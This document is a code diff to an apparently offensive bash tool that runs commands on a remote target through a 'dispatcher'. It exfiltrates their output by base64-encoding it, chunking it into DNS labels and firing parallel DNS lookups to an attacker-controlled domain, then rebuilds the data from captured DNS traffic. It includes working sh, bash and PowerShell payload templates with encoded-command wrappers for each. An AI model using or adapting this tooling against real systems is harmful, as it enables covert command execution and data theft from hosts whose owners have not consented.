@@ -6,7 +6,10 @@ debug=0
 shell=bash #bash, sh or powershell
 strict_label_charset=1
 outfile=/dev/stdout
+timeout=10
+threads=5
 
+signature="---procrustis--"
 trap "setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)" EXIT
 
 ########FUNCTION DEFINITIONS#############
@@ -24,6 +27,8 @@ Usage:
     -s LABEL_SIZE=30    The size of each label. len(data1)
     -o FILE=stdout      The file where the command output will be stored
     -w SHELL=bash       Supported shells are bash, sh, powershell|ps
+    -m TIMEOUT=10       Seconds after which the script exits when no new data are received
+    -t THREADS=10       Number of threads/processes to use when extracting the data
     -r                  No encoding of +/= characters before issuing dns requests
     -v                  Verbose mode
     
@@ -47,20 +52,6 @@ function b64 {
     else
         iconv -f UTF-8 -t "$target_enc" | base64 -w0
     fi
-}
-
-function listen_for {
-    local data dns_req_host
-    local postfix="$1"
-    
-    while read -u "$dns_data_fd" -r line || [[ -n $line ]]; do
-        if [[ $line == *"${postfix}"* ]]; then
-            dns_req_host=$(echo "$line"|grep -Eo "[^ ]+${postfix}")
-            data=${dns_req_host%${postfix}}
-            break
-        fi
-    done
-    printf %s $data
 }
 
 function strict_translator {
@@ -129,6 +120,16 @@ while [[ $# -gt 0 ]]; do
         shift
         shift
         ;;
+        -t)
+        threads="$2"
+        shift
+        shift
+        ;;
+        -m)
+        timeout="$2"
+        shift
+        shift
+        ;;
         -r|--relaxed)
         strict_label_charset=0
         shift
@@ -177,66 +178,46 @@ printf "Dispatcher: ${YELLOW}%s${NC}\n" "$dispatcher"
 printf "Base DNS Host: ${YELLOW}%s${NC}\n" "$dns_host"
 printf "DNS Trigger Command: ${YELLOW}%s${NC}\n" "$dns_trigger"
 printf "Number of labels and label size: ${YELLOW}${nlabels}x${label_size}${NC}\n"
+printf "Number of remote threads: ${YELLOW}${threads}${NC}\n"
+printf "Timeout: ${YELLOW}${timeout}${NC}\n"
 [[ ! -x $dispatcher ]] && printf "${RED}Dispatcher file is not executable${NC}\n"
 [[ $strict_label_charset -ne 1 && $shell == powershell ]] && printf "${RED}Windows+Strict Label Charset OFF=?${NC}\n"
 [[ -t 0 ]] && printf "${RED}NS DNS data are expected through stdin, check usage examples${NC}\n"
 
 ##########END OF ARGUMENT PROCESSING#############
 
-##########server-side processing definitions#######
-
-#looks like different script would be more appropriate for implementing
-#the full exfiltration logic on server side similar with: https://github.com/0xC01DF00D/Collabfiltrator
-#the below command should work for bash with support for parallelism through xargs (missing proper %STAGE_ID% impl)
-#bash_cmd="(${cmd})|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -P %THREADS% -n %NLABELS% bash -c 'IFS=.;echo %dns_trigger% \"\$*\".%STAGE_ID%%UNIQUE_DNS_HOST%' bash"
-
-#since powershell v7, we can add -Parallel and throttleLimit as parameters to foreach
-#powershell_cmd=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).split("(.{1,%LABEL_SIZExNLABELS%})")|?{$_}|%{%dns_trigger% $("{0}{1}" -f $_.replace("(.{1,%LABEL_SIZE%})",'$1.'),"%UNIQUE_DNS_HOST%")}
-
 ##########sh definitions#######
 assign sh outer_cmd_template 'sh -c $@|base64${IFS}-d|sh . echo %CMD_B64%'
 
-assign sh innerdns_cmd_template ' %dns_trigger% %USER_CMD%.%STAGE_ID%%UNIQUE_DNS_HOST%'
-
-assign sh user_cmd_template "\`(${cmd})|base64 -w0|cut -b\$((%INDEX%+1))-\$((%INDEX%+%COUNT%))\`"
+assign sh inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign sh user_cmd_template "\`(${cmd})|base64 -w0|cut -b\$((%INDEX%+1))-\$((%INDEX%+%COUNT%))|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'\`"
+    assign sh inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 }
+#assign bash inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$(($(date +%N)/100000%5)) -eq 0 ]] && wait or sleep' ."
 
-assign sh user_cmd_out_len "\`(${cmd})|base64 -w0|wc -c\`"
-assign sh user_cmd_sep .
 ##########bash definitions#######
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
 
-assign bash innerdns_cmd_template ' %dns_trigger% %USER_CMD%.%STAGE_ID%%UNIQUE_DNS_HOST%'
-
-assign bash user_cmd_template "\`(${cmd})|base64 -w0|{ read -r c;printf \${c:%INDEX%:%COUNT%}; }\`"
+assign bash inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign bash user_cmd_template "\`(${cmd})|base64 -w0|{ read -r c;printf \${c:%INDEX%:%COUNT%}; }|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'\`"
+    assign bash inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 }
-
-assign bash user_cmd_out_len "\`(${cmd})|base64 -w0|wc -c\`"
-assign bash user_cmd_sep .
+#assign bash inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$((RANDOM%10)) -eq 0 ]] && wait or sleep' ."
 
 ###########powershell definitions########
-
 assign powershell outer_cmd_template "powershell -enc %CMD_B64%"
 
-assign powershell innerdns_cmd_template '%dns_trigger% $("{0}.{1}{2}" -f (%USER_CMD%),"%STAGE_ID%","%UNIQUE_DNS_HOST%")'
-#assign powershell innerdns_cmd_template '(1..5)|%{%dns_trigger% $("{0}.{1}{2}" -f (%USER_CMD%),"%STAGE_ID%","%UNIQUE_DNS_HOST%")}'
-
-assign powershell user_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).Substring(%INDEX%,%COUNT%)"
+#since powershell v7, we can add -Parallel and throttleLimit as parameters to foreach for multi process/threading extraction
+#we cant really depend on it, for now serialized
+assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})+(echo \"\`n%SIGNATURE%\"))) -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign powershell user_cmd_template "([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).Substring(%INDEX%,%COUNT%) -replace '\+','-1' -replace '/','-2' -replace '=','-3')"
+    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})+(echo \"\`n%SIGNATURE%\"))) -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
 }
-
-assign powershell user_cmd_out_len "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).length"
-assign powershell user_cmd_sep '+"."+'
 
 #######end of definitions###########
 
 #definitions sanity check
-vars=(outer_cmd_template innerdns_cmd_template user_cmd_template user_cmd_out_len user_cmd_sep)
+vars=(outer_cmd_template inner_cmd_template)
 for var in "${vars[@]}"; do
     [[ -z ${!var} ]] && echo "Undeclared var: $var" && exit
 done
@@ -250,61 +231,47 @@ unique_dns_host="${run_uid}.${dns_host}"
 
 #extracting command output length
 echo -e "\nTrying to execute: \"${cmd}\""
-pre_innerdns_cmd=${innerdns_cmd_template}
-pre_innerdns_cmd=${pre_innerdns_cmd//'%dns_trigger%'/$dns_trigger}
-pre_innerdns_cmd=${pre_innerdns_cmd//'%UNIQUE_DNS_HOST%'/$unique_dns_host}
-pre_innerdns_cmd=${pre_innerdns_cmd//'%STAGE_ID%'/len}
-innerdns_cmd=${pre_innerdns_cmd//'%USER_CMD%'/${user_cmd_out_len}}
-debug_print "innerdns_cmd=$innerdns_cmd"
+inner_cmd=${inner_cmd_template}
+inner_cmd=${inner_cmd//'%DNS_TRIGGER%'/$dns_trigger}
+inner_cmd=${inner_cmd//'%UNIQUE_DNS_HOST%'/$unique_dns_host}
+inner_cmd=${inner_cmd//'%NLABELS%'/$nlabels}
+inner_cmd=${inner_cmd//'%LABEL_SIZE%'/$label_size}
+inner_cmd=${inner_cmd//'%CHUNK_SIZE%'/$((nlabels*label_size))}
+inner_cmd=${inner_cmd//'%SIGNATURE%'/"${signature}"}
+inner_cmd=${inner_cmd//'%THREADS%'/"${threads}"}
+debug_print "inner_cmd=$inner_cmd"
 
-cmd_b64=$(echo "$innerdns_cmd"|b64)
+cmd_b64=$(echo "$inner_cmd"|b64)
 debug_print "cmd_b64=$cmd_b64"
 
 outer_cmd=${outer_cmd_template//'%CMD_B64%'/$cmd_b64}
 debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
 
 "$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
-#(sleep 2;"$dispatcher" "$outer_cmd" >/dev/null 2>&1)&
-cmd_out_len=$(listen_for ".len${unique_dns_host}")
 
-[[ -z $cmd_out_len ]] && {
-    echo "Failed to get the output length, verify that we can listen to DNS traffic"
-    exit
-}
-
-echo "The command output length is: $cmd_out_len"
-
-#extracting the command output
-pre_innerdns_cmd=${innerdns_cmd_template}
-pre_innerdns_cmd=${pre_innerdns_cmd//'%dns_trigger%'/$dns_trigger}
-pre_innerdns_cmd=${pre_innerdns_cmd//'%UNIQUE_DNS_HOST%'/$unique_dns_host}
-cmd_out=""
-for ((index_base=0;index_base<${cmd_out_len};index_base+=${nlabels}*${label_size}));do
-    innerdns_cmd=${pre_innerdns_cmd//'%STAGE_ID%'/iter${index_base}}
-    for index in `seq $((index_base)) ${label_size} $((index_base+(nlabels-1)*label_size))`;do
-        [[ $index -ge $cmd_out_len ]] && break
-        count=$(((cmd_out_len-index)>label_size?label_size:cmd_out_len-index))
-        user_cmd=${user_cmd_template//'%INDEX%'/${index}}
-        user_cmd=${user_cmd//'%COUNT%'/${count}}
-        innerdns_cmd=${innerdns_cmd//'%USER_CMD%'/${user_cmd}${user_cmd_sep}'%USER_CMD%'}
-    done
-    innerdns_cmd=${innerdns_cmd//${user_cmd_sep}'%USER_CMD%'}
-    debug_print "$innerdns_cmd"
-    
-    cmd_b64=$(echo "$innerdns_cmd"|b64)
-    debug_print "cmd_b64=$cmd_b64"
-
-    outer_cmd=${outer_cmd_template//'%CMD_B64%'/$cmd_b64}
-    debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
-    
-    "$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
-    data=$(listen_for ".iter${index_base}${unique_dns_host}")
-    debug_print "data for index_base=${index_base}: $data"
-    
-    cmd_out="${cmd_out}${data}"
-    debug_print "$cmd_out"
-    printf "\r[$index_base/$cmd_out_len]"
+postfix="$unique_dns_host"
+all_chunks=()
+while :;do 
+    read -t $timeout -u "$dns_data_fd" -r line || break
+    if [[ $line == *"${postfix}"* ]]; then
+        dns_req_host=$(echo "$line"|grep -Eo "[^ ]+${postfix}")
+        debug_print "dns_req_host=$dns_req_host"
+        
+        all_data=${dns_req_host%${postfix}}
+        index=${all_data##*.}
+        chunk=$(printf %s "${all_data%.*}" | tr -d '.')
+        debug_print "index=$index chunk=$chunk"
+        
+        all_chunks[$index]=$chunk
+        [[ ${#chunk} -ne $((nlabels*label_size)) ]] && nchunks=$index
+        [[ ${#all_chunks[@]} -eq $nchunks ]] && break
+        
+        printf "\rReceived chunks: ${#all_chunks[@]}"
+    fi
 done && echo
 
-echo "$cmd_out" | tr -d . | strict_translator -d | b64 -d >> "$outfile"
-echo
+output=$( (IFS=;echo "${all_chunks[*]}")|strict_translator -d|b64 -d)
+last_line=$(echo "$output"|tail -n1)
+echo "$output"|sed '$d' >> "$outfile"
+
+[[ $last_line != "$signature" ]] && printf "\n${RED}Missing the output signature: try increasing timeout${NC}"
